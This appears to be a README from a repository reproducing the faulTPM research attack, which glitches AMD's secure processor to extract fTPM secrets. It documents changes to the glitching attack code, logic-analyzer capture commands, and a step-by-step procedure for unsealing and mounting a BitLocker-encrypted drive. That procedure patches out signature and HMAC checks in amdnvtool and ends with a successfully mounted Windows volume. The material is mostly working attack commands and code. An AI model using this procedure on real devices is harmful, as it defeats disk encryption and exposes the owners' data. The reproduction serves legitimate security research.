# Artifacts of: faulTPM: Exposing AMD fTPMs’ Deepest Secrets"

This repository contains all modifications and additional scripts we had to do while reproducing

# psptool

- patching executable firmware with supplied .elf file instead of a premodified binary blob

# amd-sp-glitch

- `.gitignore`: ignore **pycache**
- `attack-code/teensy_cli.txt`: Deduplicate help
- `attack-code/teensy_firmware/Makefile`: Use `#` instead of `//` for comments
- `attack-code/teensy_firmware/Makefile`: Update `COMPILERPATH` and `TEENSY4_PATH` to use new paths
- `attack-code/teensy_firmware/attack.cpp`: Fix timeout for "attack" loop (it didn't terminate before)
- `attack-code/teensy_firmware/teensy_pins.hpp`: Use `inline` instead of `constexpr` (was necessary for our compiler version)
- `attack-code/attack.py`: Was only in `attack-code/ParameterDetermination.md`

- `attack-code/attack.py`: Updated values for our system
- `attack-code/plot.py`: Added ability to create relative graphs
- `attack-code/plot.py`: Fixes to stop crashing
- `attack-code/teensy.py`: Small fix (detect success), Formatting & reduced delay
- `attack-code/pyproject.toml`: Added to enable usage of [uv](https://docs.astral.sh/uv/)
  - Can be used with e.g. `uv run attack.py` and `source .venv/bin/activate`

# attack-scripts

These scripts are intended to aid in visualization during the attack. \
They should be copied into `amd-sp-glitch/attack-code/` and run from there

- monitor.sh: Shows overview of the most recent attack
- python.sh: Runs attack and pipes the output into a file with the current date and time
- show-updating-graph: Repeatedly shows the resulting graph

# Using sigrok-cli with custom so (specific to the Sipeed SLogic16U3)

- Install `sigrok-cli` using package manager
- Download AppImage from [https://dl.sipeed.com/shareURL/SLogic](https://dl.sipeed.com/shareURL/SLogic)
- Extract AppImage: `./PulseView-SLogic-260424-x86_64.AppImage --appimage-extract`
- Capture 10M samples `LD_LIBRARY_PATH="/path/to/extracted/folder/squashfs-root/usr/lib/:$LD_LIBRARY_PATH" sigrok-cli -d sipeed-slogic-analyzer --config "logic_channels=8:voltage_threshold=1.6-1.6,samplerate=20M" --samples 10M --channels D0=VCC,D1=Teensy,D2=SPI_RESET,D3=CS,D4=CLK,D5=DO,D6=DI,D7=WP -t Teensy=1 --output-format binary > /tmp/test.bin`

# hexdump_to_csv.py

- Script to convert sigrok/pulseview generated .bin trace-file into the saleae format as required by [psptrace](https://github.com/PSPReverse/PSPTrace)
- Note: The timestamps are incorrect and estimated only using the sample rate (`BYTE_RATE_HZ`)!

# Hacky workaround to actually decrypt the bitlocker volume

The following is based on the README of [ftpm_attack](https://github.com/PSPReverse/ftpm_attack)

Compiling the firmware (`.elf` target only) included and use our modified [PSPTool](./psptool) to replace the firmware

- `sudo dnf install dislocker fuse-dislocker`
- `uv python install python3.8`
- `git clone https://github.com/PSPReverse/ftpm_attack.git`
- `cd ftpm_attack`
- `git submodule update --init`
- `uv init --managed-python -p python3.8 .`
- Set python version in `pyproject.toml` to "==3.8.20"
- `uv venv`
- `cd tools/PSPTool; uv pip install .`
- `cd ../amd-nv-tool; uv pip install .`
- `cd ../../`
- `uv add pycrypto`
- `uv add setuptools`
- `source .venv/bin/activate`

- Copy dumped BIOS into data/a520m.rom
- Write dumped ftpm key to a520m_seed.hex
- Patch (break) implementation:

```python
# Add following to .venv/lib/python3.8/site-packages/amdnvtool/crypto.py:106
                # Start of patch
                if len(ftpm_key_moduli) > 0:
                    import sys
                    print("##########", file=sys.stderr)
                    print("Skipping contents ftpm_key_moduli: " + str(pbtt.signed_entity), file=sys.stderr)
                    print("##########", file=sys.stderr)
                    continue
                # End of patch
```

```python
# Do the same furhter down (now) .venv/lib/python3.8/site-packages/amdnvtool/crypto.py:126
                # Start of patch
                if len(ftpm_app_ids) > 0:
                    import sys
                    print("##########", file=sys.stderr)
                    print("Skipping contents ftpm_app_ids: " + str(pbtt.signed_entity), file=sys.stderr)
                    print("##########", file=sys.stderr)
                    continue
                # End of patch
```

```python
# Wasn't necessary last time round
# Add following to .venv/lib/python3.8/site-packages/amdnvtool/raw.py:411 (basically diable assert_all_hmacs_are_valid(key))
            # Start of patch
            import sys
            print("##########", file=sys.stderr)
            print("Warning: Disabling valid hmacs check", file=sys.stderr)
            print("##########", file=sys.stderr)
            continue
            # End of patch
```

- Call on ideapad to make sure our patches may have a chance of working: `amdnvtool data/ideapad.rom -s $(cat data/ideapad_seed.hex) > data/ideapad.nvram` -> If no git changes: Ok
- `uv run -m amdnvtool data/a520m.rom -s $(cat data/a520m_seed.hex) > data/a520m.nvram`
- Instead of booting Linux on the target we decided to just plug in the targets 2.5" SDD into a cheap SATA to USB enclosure
- `sudo dislocker-metadata -V /dev/sdb3 > data/a520m.dislocker-metadata`
- `grep -B5 -A23 TPM_ENCODED data/a520m.dislocker-metadata | grep 0x00000 | grep -oE "([ -][0-9a-f]{2})+ $" | sed "s/[ -]//g" | xxd -r -p > data/a520m.tpm`
- `python tools/amd_ftpm2_unseal.py data/a520m.nvram data/a520m.tpm` -> Copy decrypted vmk to data/a520m-vmk.hex
- `cat data/a520m-vmk.hex | xxd -r -p > data/a520m.vmk`

- `sudo mkdir /mnt/dislocked`
- `sudo dislocker-fuse -K data/a520m.vmk -V /dev/sdb3 /mnt/dislocked`
- `sudo mkdir /mnt/dislocked-files`
- `sudo mount /mnt/dislocked/dislocker-file /mnt/dislocked-files`
- Successfully mounted

```bash
sudo lsd /mnt/dislocked-files
 '$Recycle.Bin'             inetpub           'Program Files (x86)'   'System Volume Information'
 'Documents and Settings'   pagefile.sys      ProgramData             Users
 DumpStack.log.tmp          PerfLogs          Recovery                Windows
 hiberfil.sys               'Program Files'   swapfile.sys
```
